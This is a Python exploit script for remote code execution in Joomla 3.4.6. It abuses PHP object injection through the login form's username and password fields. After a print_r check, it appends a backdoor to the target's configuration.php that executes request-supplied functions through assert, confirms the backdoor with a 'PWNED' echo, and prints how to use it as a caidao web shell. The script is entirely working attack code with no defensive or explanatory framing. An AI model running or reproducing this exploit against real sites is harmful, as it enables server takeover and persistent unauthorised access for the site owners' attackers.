#!/usr/bin/env python3
###################################joomla-3.4.6-rce######################################

import requests
from bs4 import BeautifulSoup
import string
import random
import argparse

#pass
backdoor_param = "hacden"

def random_string(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def get_token(url, cook):
    try:
        resp = requests.get(url, cookies=cook)
        html = BeautifulSoup(resp.text, 'html.parser')
        csrf = html.find_all('input')[-1]
        token = csrf.get('name')
        return token
    except:
        pass


def get_cook(url):
    resp = requests.get(url)
    return resp.cookies


def gen_pay(function, check_string):
    # Generate the payload for call_user_func('FUNCTION','COMMAND')
    template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
    payload =  check_string + ' || $a=\'http://xxx\';'
    final = template.replace('PAYLOAD', payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME',function).replace('FUNC_LEN', str(len(function)))
    return final


def make_req(url, object_payload,cook,token):

    user_payload = '\\0\\0\\0' * 9
    padding = 'AAA'  # It will land at this padding

    inj_object = '";'
    inj_object += object_payload
    inj_object += 's:6:"return";s:102:'  # end the object with the 'return' part
    password_payload = padding + inj_object
    params = {
        'username': user_payload,
        'password': password_payload,
        'option': 'com_users',
        'task': 'user.login',
        token: '1'
    }

    resp = requests.post(url, cookies=cook, data=params)
    return resp.text


def get_backdoor_pay():
    # This payload will backdoor the the configuration .PHP with an eval on POST request
    function = 'assert'
    template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
    payload = 'file_put_contents(\'configuration.php\',\'if(isset($_REQUEST[\\\'' + backdoor_param + '\\\'])) register_shutdown_function($_REQUEST[\\\'fuck\\\'], $_REQUEST[\\\''+ backdoor_param +'\\\']);\', FILE_APPEND) || $a=\'http://xxx\';'
    final = template.replace('PAYLOAD', payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME',function).replace('FUNC_LEN', str(len(function)))
    return final

def ping_backdoor(url, param_name):
    res = requests.get(url + 'configuration.php?fuck=assert&' + param_name + "=" + 'echo \'PWNED\';')
    if 'PWNED' in res.text:
        return True
    return False

def get_cook_tonken(url):
    cook = get_cook(url)
    token = get_token(url, cook)
    return cook,token

def check(url):
    print('[+] Sending request checking..')
    check_string = random_string(20)
    cook,token = get_cook_tonken(url)
    print("GET Cookie over")
    print("The token is %s" % token)
    html = make_req(url, gen_pay('print_r', check_string),cook,token)
    if check_string in html:
        return True
    else:
        return False

def exploit(url):
    target_url = url + 'index.php/component/users'
    cook, token = get_cook_tonken(url)
    make_req(target_url, get_backdoor_pay(),cook,token)
    if ping_backdoor(url, backdoor_param):
        print('Backdoor implanted, eval your code at ' + url + 'configuration.php?fuck=assert in a POST with caidao pass: ' + backdoor_param)

def run(protol,url,port):
    if port:
        url = protol + "://" + url + ":" + port.strip() + '/'
    else:
        url = protol + "://" + url + '/'
    try:
        if (check(url)):
            print('----------------------------------------OK!There is Vulnerable----------------------------------------')
            print("[+] Start Getshell")
            exploit(url)
            msg = "Get shell Success"
            return True, url, msg
        else:
            msg = 'There is Seems NOT Vulnerable'
            return False, url, msg
    except:
        msg = 'There is Seems NOT Vulnerable'
        return False,url,msg

if __name__ == '__main__':
    url = "       xxx.xxx.xxx.xxx   "
    print(run("http",url.strip(),"      "))